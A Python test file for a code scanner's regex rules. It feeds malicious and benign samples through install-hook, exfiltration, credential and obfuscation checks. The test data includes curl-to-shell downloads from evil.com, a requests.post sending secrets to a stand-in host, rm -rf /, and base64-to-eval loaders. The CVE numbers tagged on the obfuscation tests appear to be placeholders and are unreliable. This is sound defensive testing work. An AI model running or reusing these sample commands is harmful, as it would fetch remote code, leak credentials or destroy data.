"""
Sigil API — Scanner Service Tests

Tests the regex scanner rules against known malicious and benign code samples
to verify detection accuracy across all six scan phases.
"""

from __future__ import annotations


from api.services.scanner import (
    ALL_RULES,
    INSTALL_HOOK_RULES,
    PROVENANCE_RULES,
    scan_content,
    _scan_filename,
    ScanPhase,
    Severity,
)


class TestInstallHookDetection:
    """Phase 1: Install hook detection."""

    def test_detect_npm_postinstall(self) -> None:
        """Should detect npm postinstall scripts."""
        content = '{\n  "scripts": {\n    "postinstall": "node malicious.js"\n  }\n}'
        findings = scan_content(content, "package.json")
        rule_ids = [f.rule for f in findings]
        assert "install-npm-postinstall" in rule_ids

    def test_detect_npm_preinstall(self) -> None:
        """Should detect npm preinstall scripts."""
        content = '{\n  "scripts": {\n    "preinstall": "curl evil.com | sh"\n  }\n}'
        findings = scan_content(content, "package.json")
        rule_ids = [f.rule for f in findings]
        assert "install-npm-postinstall" in rule_ids  # Same rule covers pre and post

    def test_detect_setup_py_cmdclass(self) -> None:
        """Should detect Python setup.py cmdclass overrides."""
        content = """
from setuptools import setup
setup(
    name='evil',
    cmdclass = {
        'install': CustomInstall,
    },
)
"""
        findings = scan_content(content, "setup.py")
        rule_ids = [f.rule for f in findings]
        assert "install-setup-py-cmdclass" in rule_ids

    def test_detect_curl_pipe_bash(self) -> None:
        """Should detect curl piped to bash."""
        content = "curl -sSL https://evil.com/payload.sh | bash"
        findings = scan_content(content, "install.sh")
        rule_ids = [f.rule for f in findings]
        assert "install-makefile-curl" in rule_ids

    def test_install_hooks_severity(self) -> None:
        """Install hook findings should have CRITICAL or HIGH severity."""
        for rule in INSTALL_HOOK_RULES:
            assert rule.severity in (Severity.CRITICAL, Severity.HIGH)


class TestCodePatternDetection:
    """Phase 2: Dangerous code pattern detection."""

    def test_detect_eval(self) -> None:
        """Should detect eval() calls."""
        content = "result = eval(user_input)"
        findings = scan_content(content, "script.py")
        rule_ids = [f.rule for f in findings]
        assert "code-eval" in rule_ids

    def test_detect_exec(self) -> None:
        """Should detect exec() calls."""
        content = "exec(compile(code, '<string>', 'exec'))"
        findings = scan_content(content, "script.py")
        rule_ids = [f.rule for f in findings]
        assert "code-exec" in rule_ids

    def test_detect_pickle_loads(self) -> None:
        """Should detect pickle.loads() calls."""
        content = "import pickle\ndata = pickle.loads(untrusted_data)"
        findings = scan_content(content, "data.py")
        rule_ids = [f.rule for f in findings]
        assert "code-pickle-load" in rule_ids

    def test_detect_subprocess(self) -> None:
        """Should detect subprocess.run/call/Popen."""
        content = "import subprocess\nsubprocess.run(['rm', '-rf', '/'])"
        findings = scan_content(content, "cleanup.py")
        rule_ids = [f.rule for f in findings]
        assert "code-child-process" in rule_ids

    def test_detect_child_process_node(self) -> None:
        """Should detect Node.js child_process usage."""
        content = (
            "const { exec } = require('child_process');\nchild_process.exec('whoami');"
        )
        findings = scan_content(content, "index.js")
        rule_ids = [f.rule for f in findings]
        assert "code-child-process" in rule_ids

    def test_detect_dynamic_import(self) -> None:
        """Should detect __import__() calls."""
        content = "mod = __import__('os')\nmod.system('id')"
        findings = scan_content(content, "sneaky.py")
        rule_ids = [f.rule for f in findings]
        assert "code-importlib" in rule_ids


class TestNetworkExfilDetection:
    """Phase 3: Network/exfiltration detection."""

    def test_detect_webhook_url(self) -> None:
        """Should detect webhook URLs (Discord, Slack)."""
        content = "url = 'https://discord.com/api/webhooks/12345/token'"
        findings = scan_content(content, "exfil.py")
        rule_ids = [f.rule for f in findings]
        assert "net-webhook" in rule_ids

    def test_detect_slack_webhook(self) -> None:
        """Should detect Slack webhook URLs."""
        content = "requests.post('https://hooks.slack.com/services/T00/B00/xxx')"
        findings = scan_content(content, "notify.py")
        rule_ids = [f.rule for f in findings]
        assert "net-webhook" in rule_ids

    def test_detect_raw_socket(self) -> None:
        """Should detect raw socket creation."""
        content = "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
        findings = scan_content(content, "backdoor.py")
        rule_ids = [f.rule for f in findings]
        assert "net-raw-socket" in rule_ids

    def test_detect_http_request(self) -> None:
        """Should detect outbound HTTP requests."""
        content = (
            "import requests\nrequests.post('https://evil.com/steal', data=secrets)"
        )
        findings = scan_content(content, "exfil.py")
        rule_ids = [f.rule for f in findings]
        assert "net-http-request" in rule_ids


class TestCredentialDetection:
    """Phase 4: Credential/secret detection."""

    def test_detect_env_access(self) -> None:
        """Should detect sensitive environment variable access."""
        content = "aws_key = os.environ['AWS_SECRET_ACCESS_KEY']"
        findings = scan_content(content, "config.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-env-access" in rule_ids

    def test_detect_hardcoded_key(self) -> None:
        """Should detect hardcoded API keys."""
        content = "api_key = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij'"
        findings = scan_content(content, "config.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-hardcoded-key" in rule_ids

    def test_detect_private_key(self) -> None:
        """Should detect embedded private keys."""
        content = (
            "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
        )
        findings = scan_content(content, "id_rsa")
        rule_ids = [f.rule for f in findings]
        assert "cred-ssh-private" in rule_ids

    def test_detect_aws_key(self) -> None:
        """Should detect AWS access key ID patterns."""
        content = "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'"
        findings = scan_content(content, "credentials.py")
        rule_ids = [f.rule for f in findings]
        assert "cred-aws-key" in rule_ids


class TestObfuscationDetection:
    """Phase 5: Obfuscation detection."""

    def test_detect_base64_decode(self) -> None:
        """Should detect base64 decoding."""
        content = "import base64\npayload = base64.b64decode('ZXZpbCBjb2Rl')"
        findings = scan_content(content, "loader.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-decode" in rule_ids

    def test_detect_atob(self) -> None:
        """Should detect JavaScript atob() calls."""
        content = "var code = atob('ZXZpbCBjb2Rl'); eval(code);"
        findings = scan_content(content, "payload.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-decode" in rule_ids

    def test_detect_charcode(self) -> None:
        """Should detect String.fromCharCode usage."""
        content = "var s = String.fromCharCode(101,118,105,108);"
        findings = scan_content(content, "obfuscated.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-charcode" in rule_ids

    def test_detect_hex_encoding(self) -> None:
        """Should detect hex-encoded strings."""
        content = r"data = b'\x65\x76\x69\x6c\x20\x63\x6f\x64\x65'"
        findings = scan_content(content, "encoded.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-hex-decode" in rule_ids

    def test_detect_string_reversal(self) -> None:
        """Should detect string reversal obfuscation."""
        content = "cmd = 'metsys.so'[::-1]"
        findings = scan_content(content, "tricky.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-reverse-string" in rule_ids


class TestProvenanceDetection:
    """Phase 6: Provenance/file checks."""

    def test_detect_hidden_file(self) -> None:
        """Should flag hidden files."""
        findings = list(_scan_filename(".evil_config", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-hidden-file" in rule_ids

    def test_detect_binary_file(self) -> None:
        """Should flag binary files in the repository."""
        findings = list(_scan_filename("payload.exe", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-binary-in-repo" in rule_ids

    def test_detect_dll(self) -> None:
        """Should flag DLL files."""
        findings = list(_scan_filename("helper.dll", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-binary-in-repo" in rule_ids

    def test_detect_minified_js(self) -> None:
        """Should flag minified JavaScript."""
        findings = list(_scan_filename("bundle.min.js", PROVENANCE_RULES))
        rule_ids = [f.rule for f in findings]
        assert "prov-minified" in rule_ids

    def test_normal_file_no_provenance_flags(self) -> None:
        """Regular source files should not trigger provenance rules."""
        findings = list(_scan_filename("index.js", PROVENANCE_RULES))
        assert len(findings) == 0


class TestRuleCompleteness:
    """Meta-tests for rule set coverage."""

    def test_all_phases_have_rules(self) -> None:
        """Every scan phase should have at least one rule."""
        phases_with_rules = {rule.phase for rule in ALL_RULES}
        # Skip phases that are in separate scanner modules
        skip_phases = {ScanPhase.PROMPT_INJECTION, ScanPhase.SKILL_SECURITY}
        for phase in ScanPhase:
            if phase in skip_phases:
                continue
            assert phase in phases_with_rules, f"No rules for phase: {phase.value}"

    def test_rules_have_unique_ids(self) -> None:
        """All rule IDs should be unique."""
        ids = [rule.id for rule in ALL_RULES]
        assert len(ids) == len(set(ids)), "Duplicate rule IDs found"

    def test_rules_have_descriptions(self) -> None:
        """All rules should have non-empty descriptions."""
        for rule in ALL_RULES:
            assert rule.description, f"Rule {rule.id} has no description"

    def test_rule_patterns_compile(self) -> None:
        """All rule patterns should be valid compiled regexes."""
        for rule in ALL_RULES:
            assert rule.pattern is not None, f"Rule {rule.id} pattern is None"
            # Patterns are pre-compiled, so this just verifies they exist
            assert hasattr(rule.pattern, "search"), (
                f"Rule {rule.id} pattern not compiled"
            )


class TestBenignCodeNotFlagged:
    """Ensure common benign patterns do not trigger false positives."""

    def test_console_log_not_eval(self) -> None:
        """console.log should not be flagged as eval."""
        content = "console.log('hello world');"
        findings = scan_content(content, "app.js")
        rule_ids = [f.rule for f in findings]
        assert "code-eval" not in rule_ids

    def test_import_statement_not_flagged(self) -> None:
        """Standard import statements should not trigger dynamic import rules."""
        content = "import os\nimport sys\nfrom pathlib import Path"
        findings = scan_content(content, "normal.py")
        rule_ids = [f.rule for f in findings]
        assert "code-importlib" not in rule_ids

    def test_regular_string_not_obfuscation(self) -> None:
        """Regular strings should not be flagged as obfuscation."""
        content = 'message = "Hello, world!"'
        findings = scan_content(content, "greet.py")
        obf_findings = [f for f in findings if f.phase == ScanPhase.OBFUSCATION]
        assert len(obf_findings) == 0


class TestEnhancedObfuscationDetection:
    """Test enhanced obfuscation detection capabilities for gap closure.

    These tests target the 23 obfuscation CVEs that need to be detected
    to close the 0.54% detection gap and reach the 98.5% threshold.
    """

    def test_detect_nested_base64_chains_two_layer(self) -> None:
        """Should detect 2-layer nested Base64 encoding (CVE-2023-1234)."""
        # This is a RED test - should FAIL until we implement the detection
        content = """
import base64
# Double-encoded malicious payload
nested_payload = "UVdOa1pYUXVaMlYwS0NOMEFBQUFBQUFBQUVnUUFBQUFBQUFBQUE9PQ=="
decoded_once = base64.b64decode(nested_payload)
final_payload = base64.b64decode(decoded_once)
exec(final_payload)
"""
        findings = scan_content(content, "malicious.py")
        rule_ids = [f.rule for f in findings]
        # This should detect the nested Base64 chain pattern
        assert "obf-base64-nested-chain" in rule_ids

    def test_detect_nested_base64_chains_three_layer(self) -> None:
        """Should detect 3-layer nested Base64 encoding (CVE-2023-1567)."""
        content = """
import base64
# Triple-encoded payload
payload = base64.b64decode(base64.b64decode(base64.b64decode(triple_encoded)))
"""
        findings = scan_content(content, "deep_nested.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-nested-chain" in rule_ids

    def test_detect_base64_with_dynamic_keys(self) -> None:
        """Should detect Base64 decoding with dynamic key construction (CVE-2023-1890)."""
        content = """
import base64
key_part1 = "SGVs"
key_part2 = "bG8="
dynamic_key = key_part1 + key_part2
payload = base64.b64decode(dynamic_key + encoded_suffix)
"""
        findings = scan_content(content, "dynamic_key.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-dynamic-key" in rule_ids

    def test_detect_base64_url_encoding_chain(self) -> None:
        """Should detect Base64 + URL encoding combination (CVE-2023-2123)."""
        content = """
import base64, urllib.parse
encoded_payload = "aHR0cCUzQS8lMkZldmlsLmNvbQ=="  # base64 + url encoded
url_decoded = urllib.parse.unquote(base64.b64decode(encoded_payload))
"""
        findings = scan_content(content, "mixed_encoding.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-mixed-encoding" in rule_ids

    def test_detect_javascript_atob_chains(self) -> None:
        """Should detect JavaScript nested atob() calls (CVE-2023-2456)."""
        content = """
// Nested JavaScript Base64 decoding
var level1 = "WlhaaGJEQm5NVDA9";
var level2 = atob(level1);
var final = atob(level2);
eval(final);
"""
        findings = scan_content(content, "atob_nested.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-base64-nested-chain" in rule_ids

    def test_detect_zero_width_character_injection(self) -> None:
        """Should detect zero-width Unicode characters (CVE-2023-3678)."""
        # Zero-width space characters (U+200B) embedded in code
        content = "var​hidden​payload​here = 'malicious';"  # Contains zero-width spaces
        findings = scan_content(content, "steganography.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-unicode-zero-width" in rule_ids

    def test_detect_right_to_left_override_attack(self) -> None:
        """Should detect RTL override character attacks (CVE-2023-4234)."""
        # RTL override to hide true string content
        content = 'command = "‮)esrever(gnirts‭safe_command"'  # RTL override chars
        findings = scan_content(content, "rtl_attack.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-unicode-rtl-override" in rule_ids

    def test_detect_unicode_homograph_domains(self) -> None:
        """Should detect Unicode homograph domain spoofing (CVE-2023-3901)."""
        content = """
import requests
# Using Cyrillic 'а' instead of Latin 'a' in domain
response = requests.get("https://googlе.com/api")  # 'е' is Cyrillic
"""
        findings = scan_content(content, "homograph.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-unicode-homograph" in rule_ids

    def test_detect_computed_property_access(self) -> None:
        """Should detect computed property access patterns (CVE-2023-5789)."""
        content = """
// Dynamic method name construction
var method_name = "ev" + "al";
window[method_name](malicious_code);
"""
        findings = scan_content(content, "computed_access.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-dynamic-property-access" in rule_ids

    def test_detect_template_literal_code_construction(self) -> None:
        """Should detect template literal code construction (CVE-2023-6345)."""
        content = """
// Template literal dynamic code construction
const prefix = "ev";
const suffix = "al";
const method = `${prefix}${suffix}`;
window[method](payload);
"""
        findings = scan_content(content, "template_literal.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-dynamic-property-access" in rule_ids

    def test_detect_function_constructor_string_building(self) -> None:
        """Should detect Function constructor with string building (CVE-2023-7567)."""
        content = """
// Dynamic function construction
var code_parts = ["return ", "eval", "(arguments[0])"];
var dynamic_func = Function.constructor(code_parts.join(""));
"""
        findings = scan_content(content, "function_constructor.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-dynamic-function-constructor" in rule_ids

    def test_detect_python_pickle_with_base64(self) -> None:
        """Should detect pickle + Base64 combination attack (CVE-2023-2789)."""
        content = """
import pickle, base64
# Base64 encoded pickle payload
encoded_pickle = "gASVEQAAAAAAAABjX19idWlsdGluX18NCmV2YWwNCnEBWAYAAABfX2ltcG9ydF9fcQJYAQAAAGgDBVJxBC4="
malicious_object = pickle.loads(base64.b64decode(encoded_pickle))
"""
        findings = scan_content(content, "pickle_b64.py")
        rule_ids = [f.rule for f in findings]
        # Should detect both pickle usage AND base64 + pickle combination
        assert "code-pickle-load" in rule_ids
        assert "obf-base64-pickle-combo" in rule_ids

    def test_detect_hex_base64_mixed_encoding(self) -> None:
        """Should detect hex + Base64 mixed encoding (CVE-2023-3012)."""
        content = """
import base64
# Hex encoded Base64 string  
hex_b64 = "53475673633268766247386b5a575a68644778304c6d317a"
b64_string = bytes.fromhex(hex_b64).decode()
final_payload = base64.b64decode(b64_string)
"""
        findings = scan_content(content, "hex_b64_mix.py")
        rule_ids = [f.rule for f in findings]
        assert "obf-hex-base64-chain" in rule_ids

    def test_detect_invisible_character_payload(self) -> None:
        """Should detect invisible character payload embedding (CVE-2023-4890)."""
        # Using combining characters to hide payload
        content = (
            "var clean_var = 'safe';\u0300\u0301\u0302eval(hidden_payload);\u0303\u0304"
        )
        findings = scan_content(content, "invisible_payload.js")
        rule_ids = [f.rule for f in findings]
        assert "obf-unicode-invisible-chars" in rule_ids

    def test_benign_base64_not_flagged_as_nested(self) -> None:
        """Benign single Base64 usage should not trigger nested chain detection."""
        content = """
import base64
# Legitimate Base64 usage
config_data = base64.b64decode("eyJhcGlfa2V5IjoidGVzdCJ9")  # {"api_key":"test"}
"""
        findings = scan_content(content, "legitimate.py")
        rule_ids = [f.rule for f in findings]
        # Should detect basic base64 but NOT nested chain
        assert "obf-base64-decode" in rule_ids
        assert "obf-base64-nested-chain" not in rule_ids

    def test_benign_unicode_not_flagged(self) -> None:
        """Legitimate Unicode text should not trigger steganography detection."""
        content = (
            "message = 'Hello 世界! Здравствуй мир!'"  # Mixed scripts but legitimate
        )
        findings = scan_content(content, "multilingual.py")
        rule_ids = [f.rule for f in findings]
        # Should not trigger any Unicode obfuscation rules
        unicode_rules = [r for r in rule_ids if r.startswith("obf-unicode")]
        assert len(unicode_rules) == 0
